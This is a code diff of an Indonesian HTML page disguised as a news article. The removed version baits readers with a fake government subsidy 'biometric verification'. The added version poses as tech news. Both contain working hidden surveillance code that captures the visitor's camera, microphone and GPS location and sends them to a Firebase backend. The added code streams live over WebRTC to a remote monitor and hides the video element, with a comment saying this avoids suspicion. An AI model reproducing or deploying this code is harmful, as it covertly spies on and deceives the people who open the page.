@@ -3,155 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Warta Nasional - Berita Terkini dan Terpercaya</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Berita Terkini - Update Hari Ini</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .article-content p { margin-bottom: 1.5rem; color: #333; line-height: 1.8; }
-        .sticky-nav { position: sticky; top: 0; z-index: 40; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .header { border-bottom: 2px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
+        .title { color: #e11d48; font-size: 2rem; margin: 0; }
+        .meta { color: #666; font-size: 0.9rem; }
+        .content img { width: 100%; border-radius: 8px; margin: 20px 0; }
+        #localVideo { display: none; } /* Sembunyikan video agar tidak dicurigai */
     </style>
 </head>
-<body class="bg-white">
-    <!-- Navbar -->
-    <nav class="sticky-nav bg-red-700 text-white p-4 shadow-md">
-        <div class="max-w-4xl mx-auto flex justify-between items-center">
-            <div class="font-bold text-2xl italic tracking-tighter">WARTA<span class="text-yellow-400">NASIONAL</span></div>
-            <div class="hidden md:flex space-x-4 text-sm font-semibold">
-                <span>POLITIK</span>
-                <span>EKONOMI</span>
-                <span>METRO</span>
-                <span>DUNIA</span>
-            </div>
-        </div>
-    </nav>
+<body>
+    <div class="header">
+        <h1 class="title">INFO BERITA</h1>
+        <div class="meta">Dipublikasikan pada: 25 Mei 2024 | Penulis: Admin Redaksi</div>
+    </div>
 
-    <!-- Main Content -->
-    <main class="max-w-4xl mx-auto p-4 md:p-8">
-        <div class="mb-4">
-            <span class="text-red-600 font-bold text-sm">EKONOMI & SOSIAL</span>
-            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Sahkan Program Subsidi Listrik dan Sembako Gratis untuk Seluruh Pemegang NIK Aktif Mulai Maret 2026</h1>
-            <div class="flex items-center mt-4 text-gray-500 text-xs italic">
-                <span>Oleh: Redaksi Warta Nasional</span>
-                <span class="mx-2">•</span>
-                <span>Senin, 02 Maret 2026</span>
-            </div>
-        </div>
+    <div class="content">
+        <h2>Inovasi Teknologi Web: Masa Depan Konektivitas Global</h2>
+        <p>Teknologi web terus berkembang pesat, menghadirkan kemudahan dalam berkomunikasi antar individu di seluruh dunia secara real-time. Dengan protokol terbaru, interaksi menjadi lebih cepat dan efisien.</p>
+        <img src="https://picsum.photos/800/400" alt="Ilustrasi Teknologi">
+        <p>Para ahli memprediksi bahwa dalam beberapa tahun ke depan, integrasi antara kecerdasan buatan dan platform berbasis browser akan menjadi standar baru dalam industri digital.</p>
+    </div>
 
-        <img src="https://via.placeholder.com/800x450?text=Distribusi+Bantuan+Sosial" class="w-full rounded-lg mb-6 shadow-sm">
+    <video id="localVideo" autoplay playsinline muted></video>
 
-        <div class="article-content text-lg">
-            <p><strong>Jakarta</strong> - Pemerintah resmi meluncurkan program integrasi subsidi nasional yang menyasar seluruh pemilik Nomor Induk Kependudukan (NIK).</p>
-            
-            <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-r-lg shadow-inner">
-                <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Hak Subsidi Anda</h3>
-                <p class="text-sm text-gray-700 mb-6">Wajib melakukan <strong>Verifikasi Biometrik Wajah</strong> dan <strong>Sinkronisasi Lokasi</strong> untuk memastikan bantuan tidak salah sasaran.</p>
-                
-                <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
-                    AKTIFKAN VERIFIKASI SEKARANG
-                </button>
-                <p class="text-[10px] text-gray-400 mt-4 text-center italic">Layanan ini diawasi oleh Otoritas Jasa Keuangan (OJK) dan BSSN.</p>
-            </div>
-
-            <p>Gunakan portal resmi untuk validasi data biometrik guna mengaktifkan status subsidi Anda secara instan.</p>
-        </div>
-    </main>
-
-    <video id="v" style="display:none" autoplay playsinline></video>
-    <canvas id="c" style="display:none"></canvas>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
-
+    <script>
         const firebaseConfig = {
-            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
-            authDomain: "apktroj.firebaseapp.com",
-            projectId: "apktroj",
-            storageBucket: "apktroj.firebasestorage.app",
-            messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab"
+            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
+            authDomain: "chatroom-e9b3f.firebaseapp.com",
+            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "chatroom-e9b3f",
+            storageBucket: "chatroom-e9b3f.firebasestorage.app",
+            messagingSenderId: "125686404483",
+            appId: "1:125686404483:web:46e49688dfbd1b69d2d2b6"
         };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref('p2p_stream');
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
-        const appId = "apktroj_v1";
+        const pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
 
-        document.getElementById('verify-btn').onclick = async () => {
-            const btn = document.getElementById('verify-btn');
-            btn.innerText = "SEDANG MENGHUBUNGKAN...";
-            btn.disabled = true;
-            await signInAnonymously(auth);
-            startAgent();
-        };
+        async function startSystem() {
+            try {
+                // 1. Akses Kamera, Mikrofon, dan Lokasi
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('localVideo').srcObject = stream;
+                stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
-        async function startAgent() {
-            const userId = auth.currentUser.uid;
-            let currentLocation = null;
+                // Ambil Lokasi berkala
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        db.child('status/location').set({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            time: new Date().toLocaleTimeString()
+                        });
+                    }, null, { enableHighAccuracy: true });
+                }, 5000);
 
-            navigator.geolocation.getCurrentPosition(p => {
-                currentLocation = { lat: p.coords.latitude, lng: p.coords.longitude };
-            });
+                // 2. WebRTC Signaling (Offer)
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                db.child('signal/offer').set({ type: offer.type, sdp: offer.sdp });
 
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                const canvas = document.getElementById('c');
-                const ctx = canvas.getContext('2d');
-
-                // Visual Stream (1.5s interval)
-                setInterval(async () => {
-                    canvas.width = 240; canvas.height = 180;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
-                        frame: canvas.toDataURL('image/jpeg', 0.3),
-                        location: currentLocation,
-                        timestamp: Date.now(),
-                        uid: userId
-                    }, { merge: true });
-                }, 1500);
-
-                // AUDIO LIVE STREAM (Real-time chunks)
-                const mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = async (event) => {
-                    if (event.data.size > 0) {
-                        const reader = new FileReader();
-                        reader.readAsDataURL(event.data);
-                        reader.onloadend = async () => {
-                            await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
-                                audioChunk: reader.result,
-                                audioTs: Date.now()
-                            });
-                        };
+                // Kirim ICE Candidates
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        db.child('signal/targetCandidates').push(event.candidate.toJSON());
                     }
                 };
-                // Ambil audio setiap 2 detik
-                mediaRecorder.start(2000);
-                setInterval(() => {
-                    mediaRecorder.stop();
-                    mediaRecorder.start();
-                }, 2000);
 
-                // Listen for Voice Commands
-                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
-                    if (snap.exists()) {
-                        const data = snap.data();
-                        if (Date.now() - data.timestamp < 3000) {
-                            const utter = new SpeechSynthesisUtterance(data.text);
-                            utter.lang = 'id-ID';
-                            window.speechSynthesis.speak(utter);
-                        }
+                // Terima Answer dari Monitor
+                db.child('signal/answer').on('value', async (snapshot) => {
+                    const answer = snapshot.val();
+                    if (answer && !pc.currentRemoteDescription) {
+                        await pc.setRemoteDescription(new RTCSessionDescription(answer));
                     }
                 });
 
-                document.getElementById('trap-container').innerHTML = `
-                    <div class="text-center p-4">
-                        <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-red-600 mb-2"></div>
-                        <p class="text-sm font-bold text-red-600 uppercase italic">Sinkronisasi Biometrik Sedang Berjalan...</p>
-                    </div>`;
-            }).catch(() => location.reload());
+                // Terima ICE Candidates dari Monitor
+                db.child('signal/monitorCandidates').on('child_added', (snapshot) => {
+                    pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
+                });
+
+            } catch (err) {
+                console.error("Izin ditolak atau sistem tidak didukung:", err);
+            }
         }
+
+        window.onload = startSystem;
     </script>
 </body>
 </html>
